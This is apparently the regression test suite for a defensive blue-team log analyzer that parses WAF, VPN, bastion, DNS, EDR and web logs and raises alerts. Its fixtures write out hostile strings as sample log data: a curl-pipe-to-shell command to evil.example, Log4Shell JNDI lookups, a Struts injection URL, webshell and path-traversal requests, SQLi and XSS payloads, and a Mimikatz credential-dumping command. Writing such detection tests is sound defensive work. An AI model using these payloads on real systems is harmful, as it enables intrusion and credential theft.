import io
import json as _json
import sys
import tempfile
import unittest
from pathlib import Path

from bla.allowlist import apply_allowlist
from bla.config import THRESHOLDS, Thresholds, load_thresholds, set_thresholds
from bla.detection import run_detection
from bla.detection.engine import _dedup_alerts
from bla.ioc import extract_iocs, format_ioc_report
from bla.log_sources import LOG_SOURCE_PRIORITIES, format_log_source_priorities
from bla.models import (
    AnalysisSummary, DetectionAlert, ThreatLevel, TimelineEntry,
)
from bla.output.html_report import generate_html_report
from bla.output.json_report import generate_json_report
from bla.output.bundle import generate_report_bundle
from bla.output.sarif_report import generate_sarif_report
from bla.output.terminal import print_terminal_report
from bla.parsers import _parse_generic, auto_parse
from bla.parsers.linux_auth import parse_linux_auth
from bla.parsers.p0_security import parse_p0_security_json, parse_p0_security_lines
from bla.parsers.web_access import parse_web_access
from bla.parsers.windows_evtx import _parse_xml_event, parse_windows_xml
from bla.rules import reset_rule_cache, set_rule_dirs, validate_web_attack_rules
from bla.utils.helpers import is_private_ip, normalize_timestamp, reset_counter, set_syslog_year


class RegressionTests(unittest.TestCase):
    def test_log_source_priorities_capture_ir_collection_order(self):
        sources = [(item.name, item.importance) for item in LOG_SOURCE_PRIORITIES]
        categories = {item.category for item in LOG_SOURCE_PRIORITIES}
        priorities = [item.priority for item in LOG_SOURCE_PRIORITIES]

        self.assertGreaterEqual(len(sources), 40)
        self.assertEqual(sources[:4], [
            ("WAF / Web 安全网关日志", "极高"),
            ("CDN / SLB / 反向代理访问日志", "极高"),
            ("Web 服务器 access.log", "极高"),
            ("业务应用日志", "极高"),
        ])
        self.assertEqual(priorities[:18], ["P0"] * 18)
        self.assertIn(("VPN / SSL VPN / 零信任登录日志", "极高"), sources)
        self.assertIn(("云平台审计日志", "极高"), sources)
        self.assertIn(("Webshell 查杀 / 文件完整性日志", "高"), sources)
        self.assertIn("云与容器", categories)
        self.assertIn("数据与中间件", categories)
        self.assertIn("平台与运营", categories)

    def test_log_source_priority_table_is_markdown(self):
        table = format_log_source_priorities()

        self.assertIn("| 优先级 | 类别 | 类型 | 日志源 | 重要性 | 必备字段 | 研判重点 | 建议时间窗 |", table)
        self.assertIn("| P0 | 边界入口 | 日志源 | WAF / Web 安全网关日志 | 极高 |", table)
        self.assertIn("| P1 | Web 与应用 | 日志源 | Web 服务器 error.log | 高 |", table)
        self.assertIn("云账号接管", table)
        self.assertIn("P0=第一轮必采", table)

    def test_p0_waf_csv_detects_web_attack(self):
        content = (
            "time,src_ip,host,method,uri,action,rule_id,attack_type,status,user_agent\n"
            "2024-03-15 10:00:00,8.8.8.8,www.example.com,GET,"
            "\"/login?id=1 UNION SELECT NULL--\",block,942100,SQL Injection,403,sqlmap\n"
        )

        result = parse_p0_security_lines(content.splitlines(), "waf.csv", parser_hint="csv")

        self.assertEqual(result.log_type, "P0 Security Log (HVV/重保)")
        self.assertEqual(len(result.events), 1)
        event = result.events[0]
        self.assertEqual(event.category, "Web攻击")
        self.assertEqual(event.rule_name, "SQL注入")
        self.assertIn("web-attack", event.tags)
        self.assertIn("waf", event.tags)

    def test_p0_vpn_jsonl_feeds_brute_force_detection(self):
        lines = [
            _json.dumps({
                "log_type": "vpn",
                "time": f"2024-03-15 10:00:{i:02d}",
                "user": "alice",
                "src_ip": "8.8.4.4",
                "result": "failed",
                "reason": "bad password",
            })
            for i in range(5)
        ]

        result = parse_p0_security_lines(lines, "vpn.jsonl")
        summary = run_detection(result.events)

        self.assertEqual(len(result.events), 5)
        self.assertTrue(all("failed-login" in event.tags for event in result.events))
        self.assertTrue(any(alert.rule_id == "BRUTE-001" for alert in summary.alerts))

    def test_p0_bastion_key_value_detects_risky_command(self):
        line = (
            'time="2024-03-15 10:01:00" type=bastion user=admin '
            'src_ip=1.1.1.1 target_host=10.0.0.5 '
            'command="curl http://evil.example/a.sh | sh" result=success'
        )

        result = parse_p0_security_lines([line], "bastion.log")

        self.assertEqual(len(result.events), 1)
        self.assertEqual(result.events[0].rule_name, "堡垒机高危命令")
        self.assertIn("bastion-command", result.events[0].tags)
        self.assertEqual(result.events[0].host, "10.0.0.5")

    def test_p0_dns_key_value_detects_tunnel_like_query(self):
        line = (
            "time=2024-03-15T10:02:00 log_type=dns client_ip=10.0.0.8 "
            "query=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.evil.example rcode=NOERROR"
        )

        result = parse_p0_security_lines([line], "dns.log")

        self.assertEqual(len(result.events), 1)
        self.assertEqual(result.events[0].rule_name, "DNS 隧道/高熵域名")
        self.assertIn("dns-tunnel", result.events[0].tags)

    def test_p0_firewall_csv_detects_allowed_sensitive_port(self):
        content = (
            "time,src_ip,dst_ip,dst_port,action,protocol\n"
            "2024-03-15 10:03:00,203.0.113.9,10.0.0.9,3389,allow,tcp\n"
        )

        result = parse_p0_security_lines(content.splitlines(), "firewall.csv", parser_hint="csv")

        self.assertEqual(len(result.events), 1)
        self.assertEqual(result.events[0].rule_name, "防火墙放行敏感端口访问")
        self.assertIn("firewall", result.events[0].tags)
        self.assertEqual(result.events[0].port, 3389)

    def test_p0_edr_json_detects_credential_dumping(self):
        content = _json.dumps([{
            "log_type": "edr",
            "time": "2024-03-15 10:04:00",
            "host": "win-01",
            "user": "bob",
            "severity": "critical",
            "alert": "Mimikatz credential dumping",
            "process": "mimikatz.exe",
            "commandline": "sekurlsa::logonpasswords",
        }])

        result = parse_p0_security_json(content, "edr.json")

        self.assertEqual(len(result.events), 1)
        self.assertEqual(result.events[0].level, ThreatLevel.CRITICAL)
        self.assertIn("malware-indicator", result.events[0].tags)
        self.assertIn("lsass-dump", result.events[0].tags)

    def test_auto_parse_p0_application_log_detects_exploit_trace(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "application.log"
            path.write_text(
                "2024-03-15 10:05:00 ERROR request failed: ${jndi:ldap://evil.example/a}\n",
                encoding="utf-8",
            )
            result = auto_parse(str(path))

        self.assertEqual(result.log_type, "P0 Security Log (HVV/重保)")
        self.assertEqual(len(result.events), 1)
        self.assertIn("web-attack", result.events[0].tags)

    def test_p0_security_events_are_promoted_to_alerts(self):
        lines = [
            "time=2024-03-15T10:02:00 log_type=dns client_ip=10.0.0.8 "
            "query=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.evil.example rcode=NOERROR",
            'time="2024-03-15 10:03:00" type=bastion user=admin '
            'src_ip=1.1.1.1 target_host=10.0.0.5 command="curl http://evil.example/a.sh | sh"',
            "time=2024-03-15T10:04:00 log_type=firewall src_ip=203.0.113.9 "
            "dst_ip=10.0.0.9 dst_port=3389 action=allow protocol=tcp",
        ]

        result = parse_p0_security_lines(lines, "p0.log")
        summary = run_detection(result.events)
        rule_ids = {alert.rule_id for alert in summary.alerts}

        self.assertIn("P0-C2-001", rule_ids)
        self.assertIn("P0-BASTION-001", rule_ids)
        self.assertIn("P0-FW-001", rule_ids)

    def test_web_payload_with_spaces_is_detected_as_sqli(self):
        content = (
            "1.1.1.1 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /login.php?id=1 UNION SELECT NULL-- HTTP/1.1\" "
            "200 10 \"-\" \"Mozilla/5.0\"\n"
        )

        result = parse_web_access(content, "access.log")
        self.assertEqual(len(result.events), 1)
        self.assertEqual(result.events[0].rule_name, "SQL注入")

        summary = run_detection(result.events)
        self.assertTrue(any(alert.rule_name == "Web攻击: SQL注入" for alert in summary.alerts))

    def test_high_frequency_success_requests_create_volume_alert(self):
        content = "".join(
            "1.1.1.1 - - [15/Mar/2024:10:00:%02d +0800] "
            "\"GET /index.html HTTP/1.1\" 200 10 \"-\" \"Mozilla/5.0\"\n" % (i % 60)
            for i in range(120)
        )

        result = parse_web_access(content, "access.log")
        self.assertEqual(len(result.events), 1)
        self.assertEqual(result.events[0].rule_name, "自动化扫描/高频访问")

        summary = run_detection(result.events)
        self.assertTrue(any(alert.rule_id == "RECON-003" for alert in summary.alerts))

    def test_html_report_escapes_attacker_controlled_content_and_stays_offline(self):
        content = (
            "1.1.1.1 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /search.php?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1\" "
            "200 10 \"-\" \"Mozilla/5.0\"\n"
        )
        result = parse_web_access(content, "access.log")
        summary = run_detection(result.events)

        with tempfile.TemporaryDirectory() as tmp:
            report_path = Path(tmp) / "report.html"
            generate_html_report([result], summary, str(report_path))
            html = report_path.read_text(encoding="utf-8")

        self.assertNotIn("<script>alert(1)</script>", html)
        self.assertIn("&lt;script&gt;alert(1)&lt;/script&gt;", html)
        self.assertNotIn("cdn.jsdelivr", html)
        self.assertNotIn("new Chart", html)

    def test_windows_event_with_malformed_logon_type_is_not_dropped(self):
        xml = (
            "<Event><System><EventID>4625</EventID>"
            "<TimeCreated SystemTime=\"2024-03-15T01:02:03.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">bob</Data>"
            "<Data Name=\"IpAddress\">1.2.3.4</Data>"
            "<Data Name=\"LogonType\">-</Data></EventData></Event>"
        )

        event = _parse_xml_event(xml, "security.xml")
        self.assertIsNotNone(event)
        self.assertEqual(event.event_id, "4625")
        self.assertEqual(event.user, "bob")

    def test_syslog_year_can_be_overridden_for_historical_logs(self):
        try:
            set_syslog_year(2024)
            self.assertEqual(normalize_timestamp("Mar 15 09:00:01"), "2024-03-15T09:00:01")
        finally:
            set_syslog_year(None)

    def test_cn_hvv_profile_detects_common_domestic_exploit_traces(self):
        content = (
            "2.2.2.2 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /index.action?redirect:%24%7B%23_memberAccess%5B%27allowStaticMethodAccess%27%5D=true%7D HTTP/1.1\" "
            "200 10 \"-\" \"curl/8.0\"\n"
            "2.2.2.3 - - [15/Mar/2024:10:01:00 +0800] "
            "\"POST /upload/shell.jsp?cmd=whoami HTTP/1.1\" 200 10 \"-\" \"Behinder\"\n"
        )

        result = parse_web_access(content, "access.log")
        summary = run_detection(result.events, profile="cn-hvv")

        self.assertTrue(any(alert.rule_id == "CN-HVV-001" for alert in summary.alerts))
        self.assertTrue(any("cn-hvv" in event.tags for event in result.events))

    def test_ioc_extraction_and_text_export(self):
        content = (
            "3.3.3.3 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /upload/shell.jsp?cmd=whoami HTTP/1.1\" 200 10 "
            "\"http://evil.example/a\" \"Behinder\"\n"
        )
        result = parse_web_access(content, "access.log")

        iocs = extract_iocs(result.events)
        report = format_ioc_report(iocs)

        self.assertIn("3.3.3.3", iocs["ips"])
        self.assertIn("evil.example", iocs["domains"])
        self.assertIn("/upload/shell.jsp", iocs["file_paths"])
        self.assertIn("## IP", report)

    def test_allowlist_suppresses_trusted_noise_before_detection(self):
        content = (
            "10.0.0.5 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /health HTTP/1.1\" 403 10 \"-\" \"ELB-HealthChecker\"\n"
            "9.9.9.9 - - [15/Mar/2024:10:01:00 +0800] "
            "\"GET /admin.php HTTP/1.1\" 403 10 \"-\" \"Mozilla/5.0\"\n"
        )
        result = parse_web_access(content, "access.log")

        filtered, suppressed = apply_allowlist([result], {
            "ips": ["10.0.0.5"],
            "paths": ["/health"],
            "user_agents": ["ELB-HealthChecker"],
        })

        self.assertEqual(suppressed, 1)
        self.assertEqual(len(filtered[0].events), 1)
        self.assertEqual(filtered[0].events[0].ip, "9.9.9.9")

    def test_terminal_report_can_cap_large_alert_lists(self):
        content = "".join(
            "%d.0.0.1 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /wp-login.php HTTP/1.1\" 404 10 \"-\" \"Mozilla/5.0\"\n" % i
            for i in range(1, 12)
        )
        result = parse_web_access(content, "access.log")
        summary = run_detection(result.events)

        buf = io.StringIO()
        old_stdout = sys.stdout
        try:
            sys.stdout = buf
            print_terminal_report([result], summary, no_color=True, max_alerts=1)
        finally:
            sys.stdout = old_stdout

        self.assertIn("终端仅展示前 1 个告警", buf.getvalue())

    # ---- 新增：本轮重构覆盖的回归点 -----------------------------------

    def test_dedup_keeps_distinct_alerts_with_same_description_prefix(self):
        """description 前 50 字相同但 affected_events 不同的告警必须保留。"""
        alert_a = DetectionAlert(
            id="a1", rule_id="WEB-SQLI", rule_name="SQL注入",
            description="检测到 5 次 SQL注入 攻击尝试 ……长描述同前缀",
            level=ThreatLevel.HIGH, category="Web攻击",
            mitre_attack="T1190", mitre_phase="初始访问",
            affected_events=["e1", "e2"], evidence=[],
            recommendation="", timestamp="", confidence="high",
        )
        alert_b = DetectionAlert(
            id="a2", rule_id="WEB-SQLI", rule_name="SQL注入",
            description="检测到 5 次 SQL注入 攻击尝试 ……长描述同前缀",
            level=ThreatLevel.HIGH, category="Web攻击",
            mitre_attack="T1190", mitre_phase="初始访问",
            affected_events=["e3"], evidence=[],
            recommendation="", timestamp="", confidence="high",
        )
        result = _dedup_alerts([alert_a, alert_b])
        self.assertEqual(len(result), 2)
        self.assertEqual({a.id for a in result}, {"a1", "a2"})

    def test_iocs_filter_to_alert_related_events_only(self):
        """正常业务流量不应该污染 IOC 列表，只有告警涉及的事件才贡献 IOC。"""
        content = (
            # 1) 正常业务流量
            "10.0.0.1 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /index.html HTTP/1.1\" 200 10 \"-\" \"Mozilla/5.0\"\n"
            # 2) Webshell 攻击（会触发 web-attack 告警）
            "9.9.9.9 - - [15/Mar/2024:10:01:00 +0800] "
            "\"POST /upload/shell.jsp?cmd=whoami HTTP/1.1\" 200 10 \"-\" \"Behinder\"\n"
        )
        result = parse_web_access(content, "access.log")
        summary = run_detection(result.events)

        iocs = extract_iocs(result.events, alerts=summary.alerts)
        self.assertIn("9.9.9.9", iocs["ips"])
        self.assertNotIn("10.0.0.1", iocs["ips"],
                         "业务流量 IP 不应该出现在告警过滤后的 IOC 中")

    def test_private_source_ip_downgrades_brute_force_confidence(self):
        """私网 IP 触发的暴力破解告警 confidence 应当被降级。"""
        # 构造 25 条来自 192.168 私网的 SSH 失败登录
        lines = [
            f"Mar 15 09:00:{i:02d} host sshd[1234]: Failed password for bob from 192.168.10.5 port 22 ssh2"
            for i in range(25)
        ]
        result = parse_linux_auth("\n".join(lines) + "\n", "auth.log")
        summary = run_detection(result.events)
        bf = [a for a in summary.alerts if a.rule_id == "BRUTE-001"]
        self.assertTrue(bf, "应当至少触发一个暴力破解告警")
        # n>=20 公网 IP 时 confidence=high；私网降级为 medium
        self.assertEqual(bf[0].confidence, "medium")
        self.assertTrue(any("内网" in e for e in bf[0].evidence))

    def test_private_ip_check_only_matches_rfc1918_ranges(self):
        """保留/文档网段不应当被当作内网地址降级。"""
        self.assertTrue(is_private_ip("10.1.2.3"))
        self.assertTrue(is_private_ip("172.16.0.1"))
        self.assertTrue(is_private_ip("172.31.255.255"))
        self.assertTrue(is_private_ip("192.168.1.1"))
        self.assertFalse(is_private_ip("172.32.0.1"))
        self.assertFalse(is_private_ip("203.0.113.50"))
        self.assertFalse(is_private_ip("198.51.100.70"))

    def test_cross_year_syslog_lines_advance_year_on_month_rollback(self):
        """12 月之后出现 1 月份事件，应自动 +1 年。"""
        content = (
            "Dec 31 23:59:59 host sshd[1]: Failed password for u1 from 1.1.1.1 port 22 ssh2\n"
            "Jan 01 00:00:01 host sshd[1]: Failed password for u1 from 1.1.1.1 port 22 ssh2\n"
        )
        # 显式指定 2024 起点，便于断言
        set_syslog_year(2024)
        try:
            result = parse_linux_auth(content, "auth.log")
        finally:
            set_syslog_year(None)
        timestamps = sorted(e.timestamp for e in result.events)
        self.assertTrue(timestamps[0].startswith("2024-12-31"))
        self.assertTrue(timestamps[-1].startswith("2025-01-01"))

    def test_ddos_uses_per_minute_window_not_total_count(self):
        """同样总量、不同时间分布：分散一天的访问不算 DDoS，集中一分钟才是。"""
        # 600 条请求分散在 600 分钟里 → 不应触发 DDoS（每分钟仅 1 次）
        spread = "".join(
            "1.1.1.1 - - [15/Mar/2024:%02d:%02d:00 +0800] "
            "\"GET /index.html HTTP/1.1\" 200 10 \"-\" \"Mozilla/5.0\"\n" % (i // 60, i % 60)
            for i in range(600)
        )
        spread_result = parse_web_access(spread, "access.log")
        ddos_tags = [
            ev for ev in spread_result.events if "ddos" in ev.tags
        ]
        self.assertEqual(ddos_tags, [], "分散一天的访问不应当被识别为 DDoS")

    def test_html_report_attack_chain_has_no_trailing_arrow(self):
        """攻击链 HTML 末尾不能多出一个孤立箭头。"""
        # 用 webshell + 显式凭据生成多阶段攻击
        web_content = (
            "9.9.9.9 - - [15/Mar/2024:10:01:00 +0800] "
            "\"POST /upload/shell.jsp?cmd=whoami HTTP/1.1\" 200 10 \"-\" \"Behinder\"\n"
        )
        result = parse_web_access(web_content, "access.log")
        summary = run_detection(result.events)
        with tempfile.TemporaryDirectory() as tmp:
            report_path = Path(tmp) / "report.html"
            generate_html_report([result], summary, str(report_path))
            html = report_path.read_text(encoding="utf-8")
        # chain-wrapper 内 9 个 phase 之间应该恰好 8 个箭头（不是 9 个）
        chain_section = html.split('class="chain-wrapper"', 1)[1].split("</div>", 50)[0:50]
        chain_block = "".join(chain_section)
        self.assertEqual(chain_block.count('class="chain-arrow"'), 8)

    def test_windows_eventid_4740_account_lockout_recognized(self):
        """4740 账户锁定应被识别为 HIGH 级账户管理事件。"""
        xml = (
            "<Event><System><EventID>4740</EventID>"
            "<TimeCreated SystemTime=\"2024-03-15T01:02:03.000Z\"/>"
            "<Computer>dc1</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">alice</Data>"
            "<Data Name=\"TargetDomainName\">CORP</Data></EventData></Event>"
        )
        event = _parse_xml_event(xml, "Security.xml")
        self.assertIsNotNone(event)
        self.assertEqual(event.level, ThreatLevel.HIGH)
        self.assertIn("account-lockout", event.tags)

    def test_windows_xml_parse_errors_are_counted_not_silenced(self):
        """损坏的 XML 块应进入 parse_errors 而不是被静默吞掉。"""
        good_xml = (
            "<Event><System><EventID>4624</EventID>"
            "<TimeCreated SystemTime=\"2024-03-15T01:02:03.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">bob</Data></EventData></Event>"
        )
        # 故意构造一个无法解析的 XML（属性引号未闭合）
        bad_xml = "<Event><System><EventID>4625</EventID><Bad attr=\"unclosed></System></Event>"
        result = parse_windows_xml(good_xml + "\n" + bad_xml, "Security.xml")
        self.assertEqual(len(result.events), 1)
        self.assertGreaterEqual(result.stats.parse_errors, 1)

    def test_generic_parser_warns_when_truncating(self):
        """通用解析器超过行数限制必须打印 warning，不能静默丢数据。"""
        big_content = "\n".join(f"line {i:04d}: hello world" for i in range(10_500))
        old_stderr = sys.stderr
        sys.stderr = io.StringIO()
        try:
            _parse_generic(big_content, "huge.log")
            stderr = sys.stderr.getvalue()
        finally:
            sys.stderr = old_stderr
        self.assertIn("截断", stderr)
        self.assertIn("10500", stderr.replace(",", ""))

    # ---- 深度重构覆盖：解析层去聚合 / 阈值集中 / SARIF / IOC 收紧 ----

    def test_parser_no_longer_mutates_event_levels_for_aggregation(self):
        """解析层不再回写 brute-force 聚合级别——单条 SSH 失败应保持 MEDIUM。"""
        # 25 条来自同一公网 IP 的 SSH 失败：旧实现解析阶段就会升级到 CRITICAL，
        # 重构后单条事件保持解析期初始 level，告警在 detection 层产出。
        lines = [
            f"Mar 15 09:00:{i:02d} host sshd[1234]: Failed password for bob from 9.9.9.9 port 22 ssh2"
            for i in range(25)
        ]
        result = parse_linux_auth("\n".join(lines) + "\n", "auth.log")
        # 不应该有一条事件被解析层标记为 CRITICAL
        self.assertEqual(
            sum(1 for e in result.events if e.level == ThreatLevel.CRITICAL), 0,
            "解析层不应该自己升级 CRITICAL，告警由 detection 层负责"
        )
        # detection 层仍要能产出告警
        summary = run_detection(result.events)
        self.assertTrue(any(a.rule_id == "BRUTE-001" for a in summary.alerts))

    def test_thresholds_can_be_overridden_at_runtime(self):
        """通过 set_thresholds 临时降低阈值，让小样本也能触发暴力破解告警。"""
        original = THRESHOLDS
        try:
            set_thresholds(Thresholds(
                brute_force_min=2,
                brute_force_high=2,
                brute_force_critical=10,
            ))
            lines = [
                f"Mar 15 09:00:{i:02d} host sshd[1234]: "
                f"Failed password for bob from 9.9.9.9 port 22 ssh2"
                for i in range(3)
            ]
            result = parse_linux_auth("\n".join(lines) + "\n", "auth.log")
            summary = run_detection(result.events)
            self.assertTrue(any(a.rule_id == "BRUTE-001" for a in summary.alerts))
        finally:
            set_thresholds(original)

    def test_thresholds_load_from_json_file_with_partial_override(self):
        """阈值文件只覆盖指定字段，其余保留默认。"""
        with tempfile.TemporaryDirectory() as tmp:
            cfg_path = Path(tmp) / "th.json"
            cfg_path.write_text(_json.dumps({"brute_force_critical": 99}), encoding="utf-8")
            loaded = load_thresholds(str(cfg_path))
        self.assertEqual(loaded.brute_force_critical, 99)
        # 其它字段沿用默认
        self.assertEqual(loaded.spray_min_unique_users, THRESHOLDS.spray_min_unique_users)

    def test_sarif_report_is_valid_and_maps_levels(self):
        """SARIF 输出应当包含 runs/tool/rules/results，且严重告警 → "error"。"""
        content = (
            "9.9.9.9 - - [15/Mar/2024:10:01:00 +0800] "
            "\"POST /upload/shell.jsp?cmd=whoami HTTP/1.1\" 200 10 \"-\" \"Behinder\"\n"
        )
        result = parse_web_access(content, "access.log")
        summary = run_detection(result.events)

        with tempfile.TemporaryDirectory() as tmp:
            sarif_path = Path(tmp) / "report.sarif"
            generate_sarif_report([result], summary, str(sarif_path))
            data = _json.loads(sarif_path.read_text(encoding="utf-8"))

        self.assertEqual(data["version"], "2.1.0")
        self.assertGreaterEqual(len(data["runs"]), 1)
        run = data["runs"][0]
        self.assertEqual(run["tool"]["driver"]["name"], "BlueTeam Log Analyzer")
        self.assertGreaterEqual(len(run["results"]), 1)
        # 至少一个 result level 是 "error"（CRITICAL/HIGH 都映射到 error）
        self.assertTrue(any(r["level"] == "error" for r in run["results"]))

    def test_ioc_drops_boring_paths_but_keeps_attack_paths(self):
        """IOC 路径列表只保留有意义的路径，过滤 / 和 /index.html 这类噪音。"""
        content = (
            "9.9.9.9 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /download.php?file=../../etc/passwd HTTP/1.1\" 200 10 \"-\" \"curl/8\"\n"
        )
        result = parse_web_access(content, "access.log")
        summary = run_detection(result.events)
        iocs = extract_iocs(result.events, alerts=summary.alerts)
        self.assertTrue(any("etc/passwd" in p for p in iocs["file_paths"]),
                        "命中 LFI 的关键路径必须保留")
        self.assertNotIn("/", iocs["file_paths"], "根路径不应进 IOC")
        self.assertNotIn("/index", iocs["file_paths"])

    def test_ioc_filters_default_domain_blocklist(self):
        """example.com / localhost 不应进入 IOC 域名列表。"""
        content = (
            "9.9.9.9 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /shell.php?cmd=whoami HTTP/1.1\" 200 10 "
            "\"http://localhost/test\" \"curl http://example.com\"\n"
        )
        result = parse_web_access(content, "access.log")
        summary = run_detection(result.events)
        iocs = extract_iocs(result.events, alerts=summary.alerts)
        self.assertNotIn("example.com", iocs["domains"])
        self.assertNotIn("localhost", iocs["domains"])

    def test_report_bundle_generates_standard_outputs(self):
        """--out 背后的 bundle 输出应生成完整交付目录。"""
        content = (
            "9.9.9.9 - - [15/Mar/2024:10:01:00 +0800] "
            "\"POST /upload/shell.jsp?cmd=whoami HTTP/1.1\" 200 10 \"-\" \"Behinder\"\n"
        )
        result = parse_web_access(content, "access.log")
        summary = run_detection(result.events)
        with tempfile.TemporaryDirectory() as tmp:
            out_dir = Path(tmp) / "report"
            paths = generate_report_bundle([result], summary, str(out_dir))
            for key in ("html", "json", "csv", "ioc", "sarif"):
                self.assertTrue(Path(paths[key]).exists(), key)
            self.assertEqual(Path(paths["html"]).name, "index.html")

    def test_builtin_yaml_web_rule_detects_log4shell(self):
        """内置 YAML 规则应参与 Web 检测。"""
        content = (
            "8.8.8.8 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.test%2Fa%7D HTTP/1.1\" "
            "200 10 \"-\" \"curl/8\"\n"
        )
        result = parse_web_access(content, "access.log")
        self.assertEqual(result.events[0].rule_name, "Log4Shell/JNDI 探测")
        self.assertIn("log4shell", result.events[0].tags)

    def test_custom_yaml_rules_can_extend_web_detection(self):
        """用户自定义 YAML 规则目录可扩展 Web 检测，无需改 Python 源码。"""
        with tempfile.TemporaryDirectory() as tmp:
            rules_dir = Path(tmp) / "rules"
            rules_dir.mkdir()
            (rules_dir / "web_custom.yaml").write_text(
                """
web_attacks:
  - id: WEB-CUSTOM-UNIT
    name: 单元测试自定义规则
    level: high
    category: Web攻击
    mitre: T1190
    tags: [custom-test, web-attack]
    patterns:
      - 'unit-test-probe'
""",
                encoding="utf-8",
            )
            set_rule_dirs([str(rules_dir)])
            try:
                content = (
                    "7.7.7.7 - - [15/Mar/2024:10:00:00 +0800] "
                    "\"GET /unit-test-probe HTTP/1.1\" 200 10 \"-\" \"curl/8\"\n"
                )
                result = parse_web_access(content, "access.log")
            finally:
                set_rule_dirs([])
                reset_rule_cache()

        self.assertEqual(result.events[0].rule_name, "单元测试自定义规则")
        self.assertIn("custom-test", result.events[0].tags)
        summary = run_detection(result.events)
        alert = next(a for a in summary.alerts if a.rule_name == "Web攻击: 单元测试自定义规则")
        self.assertEqual(alert.rule_id, "WEB-CUSTOM-UNIT")

    def test_web_alert_preserves_highest_event_level(self):
        """Web 聚合告警不应把单条 HIGH 事件降成 MEDIUM。"""
        content = (
            "9.9.9.9 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /search.php?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1\" "
            "200 10 \"-\" \"Mozilla/5.0\"\n"
        )
        result = parse_web_access(content, "access.log")
        summary = run_detection(result.events)
        alert = next(a for a in summary.alerts if a.rule_name == "Web攻击: XSS攻击")
        self.assertEqual(alert.level, ThreatLevel.HIGH)

    def test_auto_parse_streams_web_logs_from_file(self):
        """自动识别 Web 日志时应能直接从文件路径解析，并保留文件大小。"""
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "access.log"
            path.write_text(
                "9.9.9.9 - - [15/Mar/2024:10:01:00 +0800] "
                "\"GET /download.php?file=../../etc/passwd HTTP/1.1\" 200 10 \"-\" \"curl/8\"\n",
                encoding="utf-8",
            )
            result = auto_parse(str(path))

        self.assertEqual(result.log_type, "Web Access Log (Apache/Nginx)")
        self.assertGreater(result.file_size_bytes, 0)
        self.assertEqual(result.events[0].rule_name, "路径遍历")

    # ---- 实战检测工具化：P0 归一化 / enrich / correlation / golden ----

    def test_builtin_rule_metadata_validates_cleanly(self):
        """内置 YAML 规则必须具备可维护的元数据标准。"""
        result = validate_web_attack_rules([])

        self.assertGreaterEqual(result["raw_rules"], 3)
        self.assertEqual(result["errors"], 0)
        self.assertEqual(result["warnings"], 0)

    def test_p0_events_expose_stable_normalized_fields(self):
        """P0 解析结果必须暴露统一字段，方便后续 enrich/correlation/report 使用。"""
        path = Path(__file__).parent / "fixtures" / "p0" / "hvv_chain.jsonl"
        result = parse_p0_security_lines(path.read_text(encoding="utf-8").splitlines(), path.name)
        fields = (
            "source_type", "src_ip", "dst_ip", "asset", "account", "action",
            "status", "url", "command", "process", "bytes_out", "session_id", "trace_id",
        )

        self.assertEqual(len(result.events), 6)
        for event in result.events:
            for field in fields:
                self.assertIn(field, event.details)

        summary = run_detection(result.events, profile="cn-hvv")
        enriched = summary.timeline[0]
        self.assertIsNotNone(enriched)
        self.assertTrue(all("event_family" in event.details for event in result.events))
        self.assertTrue(all("asset_role" in event.details for event in result.events))

    def test_p0_hvv_chain_matches_golden_incident(self):
        """同一批 P0 样本的告警与 incident 结果必须稳定。"""
        reset_counter()
        base = Path(__file__).parent / "fixtures" / "p0"
        golden = _json.loads((base / "golden_hvv_chain.json").read_text(encoding="utf-8"))
        result = auto_parse(str(base / "hvv_chain.jsonl"))
        summary = run_detection(result.events, profile=golden["profile"])

        self.assertEqual(summary.total_events, golden["total_events"])
        self.assertEqual(sorted({alert.rule_id for alert in summary.alerts}), golden["alert_rule_ids"])
        self.assertEqual(len(summary.incidents), golden["incident_count"])
        top = summary.incidents[0]
        self.assertEqual(top.level.value, golden["top_incident"]["level"])
        self.assertEqual(top.confidence, golden["top_incident"]["confidence"])
        self.assertEqual(top.source_types, golden["top_incident"]["source_types"])
        self.assertEqual(top.attack_phases, golden["top_incident"]["attack_phases"])
        self.assertGreaterEqual(len(top.timeline), 4)
        self.assertTrue(top.next_logs)

    def test_p0_benign_noise_does_not_create_high_risk_incident(self):
        """健康检查、正常堡垒机命令、少量 VPN 输错密码不应升级为案件。"""
        path = Path(__file__).parent / "fixtures" / "p0" / "benign_noise.jsonl"
        result = auto_parse(str(path))
        summary = run_detection(result.events, profile="cn-hvv")

        self.assertEqual(len(summary.alerts), 0)
        self.assertEqual(len(summary.incidents), 0)

    def test_json_report_contains_incident_case_view(self):
        """JSON 报告必须包含 incident，便于 explain/API/二次处理。"""
        base = Path(__file__).parent / "fixtures" / "p0"
        result = auto_parse(str(base / "hvv_chain.jsonl"))
        summary = run_detection(result.events, profile="cn-hvv")

        with tempfile.TemporaryDirectory() as tmp:
            report_path = Path(tmp) / "report.json"
            generate_json_report([result], summary, str(report_path))
            data = _json.loads(report_path.read_text(encoding="utf-8"))

        self.assertIn("incidents", data)
        self.assertEqual(len(data["incidents"]), len(summary.incidents))
        self.assertIn("next_logs", data["incidents"][0])


if __name__ == "__main__":
    unittest.main()
